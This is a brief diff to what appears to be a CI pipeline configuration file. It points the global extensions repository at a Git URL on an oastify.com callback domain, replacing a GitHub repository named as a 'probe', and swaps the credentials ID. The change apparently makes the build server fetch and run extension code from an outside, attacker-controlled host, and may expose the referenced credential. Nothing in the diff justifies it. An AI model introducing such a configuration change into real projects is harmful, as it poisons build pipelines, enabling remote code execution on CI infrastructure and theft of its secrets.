@@ -1,5 +1,5 @@
 general:
   buildTool: 'mta'
   verbose: true
-  globalExtensionsRepository: 'https://github.com/WaterLord7788/kp-globext-probe.git'
-  globalExtensionsRepositoryCredentialsId: 'kp-nonexistent-cred-7788'
+  globalExtensionsRepository: 'https://o6vfjq2l3lyu6poh4pj5milpsgy93xdcjk2mjqmf.oastify.com/kp/x.git'
+  globalExtensionsRepositoryCredentialsId: 'kp-cred2'
